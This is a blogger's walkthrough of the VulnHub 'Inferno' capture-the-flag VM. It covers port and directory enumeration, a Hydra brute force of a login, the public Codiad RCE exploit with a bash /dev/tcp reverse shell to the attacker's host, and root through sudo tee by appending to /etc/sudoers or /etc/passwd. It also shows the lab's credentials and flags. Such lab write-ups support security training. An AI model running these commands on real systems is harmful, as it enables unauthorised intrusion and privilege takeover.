
#Inferno #Codiad


### [VulnHub - Machine Information Page](https://www.vulnhub.com/entry/inferno-11,603/)

### [YouTube - Tutorial](https://www.youtube.com/watch?v=1rfEMoZaatI)


---

- **Name**: Inferno: 1.1
- **Date release**: 6 Dec 2020
- **Author**: [mindsflee](https://www.vulnhub.com/author/mindsflee,699/)
- **Series**: [Inferno](https://www.vulnhub.com/series/inferno,405/)

### Download

Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!

- **inferno-1.1.ova** (Size: 724MB)
- **Download**: [https://mega.nz/file/WYBjWSaa#w0OewKTpWVT5_G0v-wZAhT3460Pyo1jspbRBni_UhF8](https://mega.nz/file/WYBjWSaa#w0OewKTpWVT5_G0v-wZAhT3460Pyo1jspbRBni_UhF8)
- **Download (Mirror)**: [https://download.vulnhub.com/inferno/inferno-1.1.ova](https://download.vulnhub.com/inferno/inferno-1.1.ova)

### Description

- Users: 2
- Difficulty Level: Easy/Medium

Real Life machine vs CTF.

Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear.

## About the VM:

Just download, extract and load the .ova file in VMware Workstation or Virtual Box.
The adapter is currently bridge, networking is configured for DHCP and IP will get assigned automatically

## Contact:

You can contact me on Hack the box (https://www.hackthebox.eu/profile/232477) or by email (mindsflee@hotmail.com) for hints!
This works better with VirtualBox rather than VMware ## Changelog 2020-12-06 - v1.1 2020-11-17 - v1.0

### File Information

- **Filename**: inferno-1.1.ova
- **File size**: 724MB
- **MD5**: E14D9D42A77761D61B964281DC5CEE6E
- **SHA1**: 00D22D511031B398CA3BE7ADA1BFBB3B10D10583


---

Long time no penetration testing! I have been busy with stuff, such as [updating my Doom maps](https://www.moddb.com/mods/thy-dark-rooms-of-finals) and trying to get a forklift certificate with no luck, at least I completed the theory with zero mistakes, just use common sense, but the driving perfectly part is brutal as hell.

# Installation 🔌💻🖥️🛜💾🔌

Simple installation: VirtualBox => Import appliance

Then change the network adapter to Host-Only

![](inferno_login.png)


---
---

# Enumeration

## netdiscover & nmap


```bash
# sudo netdiscover -i eth1
# sudo netdiscover -i eth1 -r 192.168.56.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                             
                                                                                                                                                           
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:07      1      60  Unknown vendor                                                                                          
 192.168.56.2    08:00:27:9a:33:f6      1      60  PCS Systemtechnik GmbH                                                                                  
 192.168.56.41   08:00:27:2e:d7:af      1      60  PCS Systemtechnik GmbH  


# nmap -sC -sV 192.168.56.41 
# nmap -sC -sV 192.168.56.41 -p-
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.41 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 11:48 CEST
Nmap scan report for 192.168.56.41
Host is up (0.0027s latency).
Not shown: 65444 closed tcp ports (reset)
PORT      STATE SERVICE           VERSION
21/tcp    open  ftp?
22/tcp    open  ssh               OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:f4:d2:47:74:86:2f:b4:94:62:cd:31:f6:ef:51:a4 (RSA)
|   256 01:e9:02:a3:ff:ff:4a:7b:f2:20:1e:0b:44:9d:7f:f7 (ECDSA)
|_  256 a5:dc:a7:b1:20:33:f1:8d:c7:dd:f1:a3:59:5d:c2:34 (ED25519)
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp    open  domain?
80/tcp    open  http              Apache httpd 2.4.38 ((Debian))
|_http-title: Dante's Inferno
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp    open  kerberos-sec?
106/tcp   open  pop3pw?
110/tcp   open  pop3?
194/tcp   open  irc?
|_irc-info: Unable to open connection
389/tcp   open  ldap?
443/tcp   open  https?
464/tcp   open  kpasswd5?
636/tcp   open  ldapssl?
750/tcp   open  kerberos?
775/tcp   open  entomb?
777/tcp   open  multiling-http?
779/tcp   open  unknown
783/tcp   open  spamassassin?
808/tcp   open  ccproxy-http?
873/tcp   open  rsync?
1001/tcp  open  webpush?
1178/tcp  open  skkserv?
1210/tcp  open  eoss?
1236/tcp  open  bvcontrol?
1300/tcp  open  h323hostcallsc?
1313/tcp  open  bmc_patroldb?
1314/tcp  open  pdps?
1529/tcp  open  support?
2000/tcp  open  cisco-sccp?
2003/tcp  open  finger?
2121/tcp  open  ccproxy-ftp?
2150/tcp  open  dynamic3d?
2600/tcp  open  zebrasrv?
2601/tcp  open  zebra?
2602/tcp  open  ripd?
2603/tcp  open  ripngd?
2604/tcp  open  ospfd?
2605/tcp  open  bgpd?
2606/tcp  open  netmon?
2607/tcp  open  connection?
2608/tcp  open  wag-service?
2988/tcp  open  hippad?
2989/tcp  open  zarkov?
4224/tcp  open  xtell?
4557/tcp  open  fax?
4559/tcp  open  hylafax?
4600/tcp  open  piranha1?
4949/tcp  open  munin?
5051/tcp  open  ida-agent?
5052/tcp  open  ita-manager?
5151/tcp  open  esri_sde?
5354/tcp  open  mdnsresponder?
5355/tcp  open  llmnr?
5432/tcp  open  postgresql?
5555/tcp  open  freeciv?
5666/tcp  open  nrpe?
5667/tcp  open  unknown
5674/tcp  open  hyperscsi-port?
5675/tcp  open  v5ua?
5680/tcp  open  canna?
6346/tcp  open  gnutella?
6514/tcp  open  syslog-tls?
6566/tcp  open  sane-port?
6667/tcp  open  irc?
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?
8081/tcp  open  blackice-icecap?
8088/tcp  open  radan-http?
8990/tcp  open  http-wmap?
9098/tcp  open  unknown
9359/tcp  open  unknown
9418/tcp  open  git?
9673/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt?
10081/tcp open  famdc?
10082/tcp open  amandaidx?
10083/tcp open  amidxtape?
11201/tcp open  smsqp?
15345/tcp open  xpilot?
17001/tcp open  unknown
17002/tcp open  unknown
17003/tcp open  unknown
17004/tcp open  unknown
20011/tcp open  unknown
20012/tcp open  ss-idi-disc?
24554/tcp open  binkp?
27374/tcp open  subseven?
30865/tcp open  unknown
57000/tcp open  unknown
60177/tcp open  unknown
60179/tcp open  unknown
MAC Address: 08:00:27:2E:D7:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.92 seconds

```

We can confirm that the following ports are available
- 22/TCP - SSH - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	- ssh-hostkey:
		- 2048 82:f4:d2:47:74:86:2f:b4:94:62:cd:31:f6:ef:51:a4 (RSA)
		- 256 01:e9:02:a3:ff:ff:4a:7b:f2:20:1e:0b:44:9d:7f:f7 (ECDSA)
		- 256 a5:dc:a7:b1:20:33:f1:8d:c7:dd:f1:a3:59:5d:c2:34 (ED25519)

- 80/TCP - HTTP - Apache httpd 2.4.38 ((Debian))
	- http-title: Dante's Inferno
	- http-server-header: Apache/2.4.38 (Debian)

Alright, let's checkout the website hosted of this machine!

![](Inferno_http.png)

```
Oh quanto parve a me gran maraviglia  
quand'io vidi tre facce a la sua testa!  
L'una dinanzi, e quella era vermiglia;  
  
l'altr'eran due, che s'aggiugnieno a questa  
sovresso 'l mezzo di ciascuna spalla,  
e se' giugnieno al loco de la cresta
```

Not much else to see here, time to find hidden URL's

## GoBuster

```bash
# gobuster dir -u http://192.168.56.34/ -w /usr/share/wordlists/dirb/common.txt  
# gobuster dir -u http://192.168.56.37/secret -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.56.41/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.41/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 638]
/inferno              (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 278]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

There is a page called "inferno", but entering gives us a prompt with a login and password to get any further. Burbsite doesn't do much in this case, so the next step is to try to brute force it with Hydra.

## Hydra 🐲🐉

```bash
# hydra -L '/home/kali/Downloads/top-usernames-shortlist.txt' -P '/usr/share/wordlists/rockyou.txt' 192.168.56.41 http-get /inferno -t 60

┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P '/usr/share/wordlists/rockyou.txt' 192.168.56.41 http-get /inferno -t 60 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 14:24:43
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking http-get://192.168.56.41:80/inferno
[STATUS] 9304.00 tries/min, 9304 tries in 00:01h, 14335095 to do in 25:41h, 60 active
[80][http-get] host: 192.168.56.41   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 14:26:18

```

We can use the wordlist for login from https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt, but consider just try using the admin as login name, since rockyou.txt is freaking huge.

Result: 
- admin
- dante1

When using the login, the page keeps on waiting, this machine seems to be broken, because another login should appear, which should direct to the **_Codiad IDE web login page_**.
Anyway, we know the tool is "Codiad", so it should still be vulnerable for a specific exploit.

# Exploitation

We will use this remote code execution exploit found on this page: https://www.exploit-db.com/exploits/49705
If you check the [GitHub](https://github.com/Codiad/Codiad) page of this software, this tool has not received update for more than half a decade.

```bash
┌──(kali㉿kali)-[~]
└─$
cd Downloads
 
┌──(kali㉿kali)-[~/Downloads]
└─$
ls
49705.py

┌──(kali㉿kali)-[~/Downloads]
└─$
python 49705.py 

Usage : 
        python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python 49705.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python 49705.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python 49705.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>

# To make this exploit work, we also have to add the login/password embedded into the beginning of the URL
# 192.168.56.112 or 192.168.56.52?
┌──(kali㉿kali)-[~/Downloads]
└─$ python 49705.py http://admin:dante1@192.168.56.41/inferno/ admin dante1 192.168.56.52 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/192.168.56.52/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
# After using the two commands from above on separate terminals, we are ready to confirm to the execution
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...

```

![](RemoteCodeExecution.png)

```bash
# On the terminal with netcat listening on port 4445, we have a connection, we use the python command to spawn a terminal
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [192.168.56.52] from (UNKNOWN) [192.168.56.41] 38410
bash: cannot set terminal process group (494): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ python -c "import pty; pty.spawn('/bin/bash')"                                                                   
<ger$ python -c "import pty; pty.spawn('/bin/bash')"                                                                                    
www-data@Inferno:/var/www/html/inferno/components/filemanager$ export TERM=xterm
<l/inferno/components/filemanager$ export TERM=xterm           
www-data@Inferno:/var/www/html/inferno/components/filemanager$ cd /home
cd /home
www-data@Inferno:/home$ ls
ls
dante
www-data@Inferno:/home$ cd dante
cd dante
www-data@Inferno:/home/dante$ ls
ls
Desktop    Downloads  Pictures  Templates  local.txt
Documents  Music      Public    Videos
www-data@Inferno:/home/dante$ ls -al
ls -al
total 64
drwxr-xr-x 11 dante dante 4096 Dec  6  2020 .
drwxr-xr-x  3 root  root  4096 Dec  6  2020 ..
-rw-------  1 dante dante   52 Dec  6  2020 .Xauthority
lrwxrwxrwx  1 root  root     9 Dec  6  2020 .bash_history -> /dev/null
-rw-r--r--  1 dante dante  220 Dec  6  2020 .bash_logout
-rw-r--r--  1 dante dante 3526 Dec  6  2020 .bashrc
drwxr-xr-x  3 dante dante 4096 Dec  6  2020 .local
-rw-r--r--  1 dante dante  807 Dec  6  2020 .profile
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Desktop
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Documents
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Downloads
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Music
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Pictures
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Public
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Templates
drwxr-xr-x  2 root  root  4096 Dec  6  2020 Videos
-rw-------  1 dante dante   33 Dec  6  2020 local.txt
www-data@Inferno:/home/dante$ cd Desktop
cd Desktop
www-data@Inferno:/home/dante/Desktop$ ls -al
ls -al
total 248
drwxr-xr-x  2 root  root    4096 Dec  6  2020 .
drwxr-xr-x 11 dante dante   4096 Dec  6  2020 ..
-rwxr-xr-x  1 root  root   68416 Dec  6  2020 inferno.txt
-rwxr-xr-x  1 root  root   35456 Dec  6  2020 paradiso.txt
-rwxr-xr-x  1 root  root  138728 Dec  6  2020 purgatorio.txt
www-data@Inferno:/home/dante$ cd Downloads
cd Downloads
www-data@Inferno:/home/dante/Downloads$ ls -al
ls -al
total 8468
drwxr-xr-x  2 root  root     4096 Dec  6  2020 .
drwxr-xr-x 11 dante dante    4096 Dec  6  2020 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   138728 Dec  6  2020 CantoI.docx
-rwxr-xr-x  1 root  root   146880 Dec  6  2020 CantoII.docx
-rwxr-xr-x  1 root  root    97152 Dec  6  2020 CantoIII.docx
-rwxr-xr-x  1 root  root    68416 Dec  6  2020 CantoIV.docx
-rwxr-xr-x  1 root  root   138856 Dec  6  2020 CantoIX.docx
-rwxr-xr-x  1 root  root    43808 Dec  6  2020 CantoV.docx
-rwxr-xr-x  1 root  root   138856 Dec  6  2020 CantoVI.docx
-rwxr-xr-x  1 root  root   146880 Dec  6  2020 CantoVII.docx
-rwxr-xr-x  1 root  root  3689352 Dec  6  2020 CantoVIII.docx
-rwxr-xr-x  1 root  root    68416 Dec  6  2020 CantoX.docx
-rwxr-xr-x  1 root  root   121464 Dec  6  2020 CantoXI.docx
-rwxr-xr-x  1 root  root   157192 Dec  6  2020 CantoXII.docx
-rwxr-xr-x  1 root  root   213136 Dec  6  2020 CantoXIII.docx
-rwxr-xr-x  1 root  root   146880 Dec  6  2020 CantoXIV.docx
-rwxr-xr-x  1 root  root   146880 Dec  6  2020 CantoXIX.docx
-rwxr-xr-x  1 root  root    97152 Dec  6  2020 CantoXV.docx
-rwxr-xr-x  1 root  root   138728 Dec  6  2020 CantoXVI.docx
-rwxr-xr-x  1 root  root   121464 Dec  6  2020 CantoXVII.docx
-rwxr-xr-x  1 root  root  2746104 Dec  6  2020 CantoXVIII.docx
-rwxr-xr-x  1 root  root    68416 Dec  6  2020 CantoXX.docx
www-data@Inferno:/home/dante/Downloads$ cat .download.dat
cat .download.dat                                                                       
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0awww-data@Inferno:/home/dante/Downloads$ exit
www-data@Inferno:/var/www/html/inferno/components/filemanager$
```

After a lot of digging, we find an interesting file called .download.dat, the content of the file is full of HEX encoded text, next step is to use [CyberChef](https://gchq.github.io/CyberChef/) and read the message for any clues.

```bash
# Input:
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a

# Output:
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

![](CyberChef_FromHex.png)

at the bottom of the text, we see something that could look like a login/password, so let's try that on a SSH connection.

---
---

# Foothold 🦶


## SSH
```bash
┌──(kali㉿kali)-[~]
└─$ ssh dante@192.168.56.41                                                                    
The authenticity of host '192.168.56.41 (192.168.56.41)' can't be established.
ED25519 key fingerprint is: SHA256:6G6ekHIDCC2b1vcJkyf1EFkDe6oT6YDmwyhvpcoZ8eM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.41' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dante@192.168.56.41's password: V1rg1l10h3lpm3
Linux Inferno 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec  6 08:00:42 2020 from 192.168.1.124
dante@Inferno:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
dante@Inferno:~$ cat local.txt
77f6f3c544ec0811e2d1243e2e0d1835
dante@Inferno:~$ 
# We have found the user-flag 🚩
# let's now get the root-flag, there is no permission to go to root directory with this user.



```



---
---

# Privilege Escalation


```bash
dante@Inferno:~$ id
uid=1000(dante) gid=1000(dante) groups=1000(dante),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
# there is a application called "tee" that we can use
```

![](tee.png)


We can use this command found in https://gtfobins.org/gtfobins/tee/

```bash
echo DATA | tee /path/to/output-file
# There is two ways we can obtain the root permission:
# 1. Exploiting the user's permission in the /etc/sudoers file
# 2. adding a new username and password to the /etc/passwd file 

# Method 1
echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a "/etc/sudoers"

# Method 2
dante@Inferno:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
dante:x:1000:1000:dante,,,:/home/dante:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
# now copy the structore of the root user:
root:x:0:0:root:/root:/bin/bash
# Now change it something like this, "daacals" is my username
echo "daacals:$(openssl passwd -6 -salt daacals password1337):0:0:daacals:/root:/bin/bash" | sudo tee -a "/etc/passwd"

dante@Inferno:~$ echo "daacals:$(openssl passwd -6 -salt daacals password1337):0:0:daacals:/root:/bin/bash" | sudo tee -a "/etc/passwd"
daacals:$6$daacals$C9zKeI27QFLri3h6w5B/TSvYF6TcJXe97tNVgl0PMjMg0ztdjf.vhkuS1laL8HIVJoLN48nLIcROWtu21sMCe/:0:0:daacals:/root:/bin/bash

dante@Inferno:~$ su daacals
Password: 
root@Inferno:/home/dante#
```


```bash
# The Root Flag
dante@Inferno:~$ sudo su
root@Inferno:/home/dante# ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
root@Inferno:/home/dante# cd ..
root@Inferno:/home# cd ..
root@Inferno:/# cd /root
root@Inferno:~# ls
proof.txt
root@Inferno:~# cat proof.txt 


 (        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 


Congrats!

You've rooted Inferno!

77f6f3c544ec0811e2d1243e2e0d1835

mindsflee

https://www.buymeacoffe.com/mindsflee

.... ..^.^.^..^.^.^.^^^^!Q!|!!|!!!!!!!||!!!^!|Q!!^!!^!!!Q!^^^^!^^!!^^^!!^!^^^!^.^^|.!!^^^^!^^^^^^!^^^^^^^.^^.^
^.^.^..^^.^^....^^^^^^.^^^QQMMMMMMMMMMMQQ!!!||MMQMQ!^!!|QMQ|!^!|!!!!!!|!!^!!^^!!!!^!|!!^!!!^!^^^!^!!!^^^^!^!^^
....^.^^^.^.^..^.^.^^^.^^^!6MMMMMMMMMMMMMMMMMIQMMMMMMQQOQMMMMQOQOOOOQOOQQQQQQ6|^!^^^!^!|!!!!^!|^!!!^!!!^!!^!^^
...^..^..^.^.^^.^^^^.^^^!^!^!QMMMMMMMMMMMMMMMMMMMMMMMMMMMMQMMMQOQQOQOQOOQOOQOQOOQOOQQQ!!!^!!!!!!^^|^!!!^!!^^!!
........^.^.^.^....^^^.^^^^^!!^IQMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMQOQOQOQOOMQQOQQOOQQOOQQOQOOQO^!^^!!!^^^^^!!|^^!
.^....^.^^^..^..^^.^^^..^!^^^^^IQMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMQMQQQOOQMMQOOOOOOOOQQOQOQOOQOQOQO!^^^!!^.^^^!^^
.^.^.^.^..^......^^.^.^.^^^^^!QMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMQQQQOQOMMMQOOOOOOOOOOQOQQQOOOOQOOQ!^^!^^^^^!^^
.^..^^^.^^..^^^^^.^!..^^^.^^MMMMMMMMMMMQIIMQMMMMMMMMMMMMMMMMMMMMQQQOQOMMMMMQO6OOOOOOOOOOOOOQOOQOOQQQQ^!.!^^!^^
.^..^^..^^^^.^.^^.^....^.OOQMMMQMQMQ6!^.^^|!IOOQMMMMMMMMMMMMMMMMQQOQQQMMMMMMOO6OOOOOOOOOOQOOOQOQQQOOOQQ^^.^^^^
